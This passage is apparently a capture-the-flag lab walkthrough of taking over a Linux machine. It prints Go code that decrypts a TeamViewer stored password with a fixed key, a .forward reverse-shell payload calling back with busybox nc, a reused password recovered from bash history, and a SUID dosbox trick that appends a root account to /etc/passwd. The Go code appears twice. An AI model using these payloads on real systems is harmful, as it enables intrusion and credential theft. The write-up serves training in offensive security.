As shown in the output above, I notice the SecurityPasswordAES. It looks like the password is encrypted. Can I decrypt it? To check the version of the Team Viewer application using the command exiftool -a -u TeamViewer_Setup_v7.exe, I obtained the version number 7.0.43148.0. Is this application version vulnerable?


When checking to see if I can decrypt the password from the Team Viewer registry files, I came across the GitHub repository shown in the image above. This project is accessible from here.


I checked the GitHub project further on how to use the application. It mentions the information shown in the picture above. Now I know the SecurityPasswordAES is hexadecimal ciphertext. To decrypt it, I must remove the punctuation from the ciphertext. Then pass the new hexadecimal string inside the hexStrCipher variable. Time to check it out. The entire Go lang source code of this project is the following:

package main

import (
    "crypto/aes"
    "crypto/cipher"
    "encoding/hex"
    "fmt"
    "log"
)

func decrypt(key, iv, data []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }

    blockMode := cipher.NewCBCDecrypter(block, iv)
    plaintext := make([]byte, len(data))
    blockMode.CryptBlocks(plaintext, data)

    return plaintext, nil
}

func main() {
    key, err := hex.DecodeString("0602000000a400005253413100040000")
    if err != nil {
        log.Fatal(err)
    }

    iv, err := hex.DecodeString("0100010067244F436E6762F25EA8D704")
    if err != nil {
        log.Fatal(err)
    }

    hexStrCipher := "1afa05622365454bf8b43255ac75ac87a60b9ad7ecc3ca9c2f856496cb8881ce"
    ciphertext, err := hex.DecodeString(hexStrCipher)
    if err != nil {
        log.Fatal(err)
    }

    plaintext, err := decrypt(key, iv, ciphertext)
    if err != nil {
        log.Fatal(err)
    }

    fmt.Printf("%x\n", plaintext)

    password := string(plaintext)
    fmt.Println(password)
}

func decrypt(key, iv, data []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }

    blockMode := cipher.NewCBCDecrypter(block, iv)
    plaintext := make([]byte, len(data))
    blockMode.CryptBlocks(plaintext, data)

    return plaintext, nil
}

func main() {
    key, err := hex.DecodeString("0602000000a400005253413100040000")
    if err != nil {
        log.Fatal(err)
    }

    iv, err := hex.DecodeString("0100010067244F436E6762F25EA8D704")
    if err != nil {
        log.Fatal(err)
    }

    hexStrCipher := "1afa05622365454bf8b43255ac75ac87a60b9ad7ecc3ca9c2f856496cb8881ce"
    ciphertext, err := hex.DecodeString(hexStrCipher)
    if err != nil {
        log.Fatal(err)
    }

    plaintext, err := decrypt(key, iv, ciphertext)
    if err != nil {
        log.Fatal(err)
    }

    fmt.Printf("%x\n", plaintext)

    password := string(plaintext)
    fmt.Println(password)
}

Exploitation

Foothold: Dropping Reverse Shell Inside .forward File of User fox

I did a Google search for .forward files and obtained the result shown in the image above. This website is located here. Basically this file is used to store email addresses. Then any email the user receives is forwarded to all the destinations in this file. I checked the content of .forward file earlier and identified it contained the following: | /usr/bin/procmail -f-. Can I replace the content with a malicious command, such as a reverse shell?


I created another .forward file on my machine. It contains the payload | busybox nc 192.168.45.167 80 -e /bin/bash to invoke a reverse shell connection to my machine at port 80, as shown in the picture above on the right terminal. Then using the following commands, I gained access to the SMB share and uploaded the .forward file as shown in the picture above:

Privilege Escalation

Vertical Privilege Escalation: Abusing dosbox to Overwrite /etc/passwd File

Since there are multiple users on the machine, I checked the directory of each user. The file .bash_history is accessible inside the home directory of user mara. This file contains the following information, which looks like a password:

sshh mara@192.168.0.191
CIARLARIELLOkj99
ssh mara@192.168.0.191
sshh mara@192.168.0.191
CIARLARIELLOkj99
ssh mara@192.168.0.191

Using the command ssh fox@192.168.231.157 and the password CIARLARIELLOkj99, I now have an SSH foothold on the target machine as the user fox as shown in the picture above.


I ran the command find / -perm -u=s -type f 2>/dev/null and obtained the result shown in the image above. And bingo! I notice the binary /usr/bin/dosbox has SUID bit set. This can be used to elevate privileges on the machine. The simplest privilege escalation vector is to create a new root user and insert this user inside the /etc/passwd file. In the past, we cannot simply use the write privileges. This is because carriage return is appended to each line. Therefore any PE we perform, such as adding a new root user inside the /etc/passwd will lead to failure. We must obtain the graphical user interface to perform PE.


To use the dosbox in a GUI fashion, I must use sshpass application. After installing it, I ran the command sshpass -p CIARLARIELLOkj99 ssh -X fox@192.168.231.157. Then I browsed over to /tmp and ran the command echo 'super:8onQsoOJZMIDM:0:0:root:/root:/bin/bash' > pwn. This basically creates a new root user called super with the password as rooted. This payload will be appended over at the /etc/passwd file using the dosbox application. After the payload file is created, I ran the command dosbox -X to start the application. Inside the new GUI dosbox application, I ran the following commands to append the new user inside the /etc/passwd file:

MOUNT D: /
D:
CD TMP
TYPE PWN >> \ETC\PASSWD
MOUNT D: /
D:
CD TMP
TYPE PWN >> \ETC\PASSWD

The commands above are self-explanatory. The D drive contains the Linux files which must be mounted. To load the Linux files, the command D: is run. Then I browse to the /tmp directory using the command CD TMP. Afterwards, I run the command TYPE PWN >> \ETC\PASSWD to add the new user inside the /etc/passwd file.


After all that, I closed down the GUI application of dosbox by pressing the X button. Then I ran the command su super and the password rooted. As shown in the picture above, now I have a root shell on the target machine :`)
